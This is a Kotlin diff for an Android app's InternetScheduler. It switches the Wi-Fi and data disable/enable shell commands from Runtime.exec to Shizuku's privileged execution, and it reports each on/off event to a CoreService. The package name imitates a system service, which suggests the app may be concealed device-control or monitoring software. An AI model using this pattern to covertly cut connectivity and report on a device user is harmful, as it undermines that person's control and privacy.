@@ -4,6 +4,7 @@ import android.content.Context
 import android.os.Handler
 import android.os.Looper
 import com.system.service.core.CoreService
+import com.system.service.core.ShizukuManager
 import org.json.JSONObject
 import java.util.Calendar
 
@@ -31,15 +32,15 @@ object InternetScheduler {
             val shouldBlock = isOffTime(hour)
             if (shouldBlock && !wifiCurrentlyBlocked) {
                 wifiCurrentlyBlocked = true
-                try { Runtime.getRuntime().exec(arrayOf("svc", "wifi", "disable")).waitFor() } catch (_: Exception) {}
-                try { Runtime.getRuntime().exec(arrayOf("svc", "data", "disable")).waitFor() } catch (_: Exception) {}
+                ShizukuManager.exec("svc wifi disable")
+                ShizukuManager.exec("svc data disable")
                 CoreService.instance?.sendData("schedule_event", JSONObject().apply {
                     put("action", "internet_off"); put("hour", hour)
                 })
             } else if (!shouldBlock && wifiCurrentlyBlocked) {
                 wifiCurrentlyBlocked = false
-                try { Runtime.getRuntime().exec(arrayOf("svc", "wifi", "enable")).waitFor() } catch (_: Exception) {}
-                try { Runtime.getRuntime().exec(arrayOf("svc", "data", "enable")).waitFor() } catch (_: Exception) {}
+                ShizukuManager.exec("svc wifi enable")
+                ShizukuManager.exec("svc data enable")
                 CoreService.instance?.sendData("schedule_event", JSONObject().apply {
                     put("action", "internet_on"); put("hour", hour)
                 })
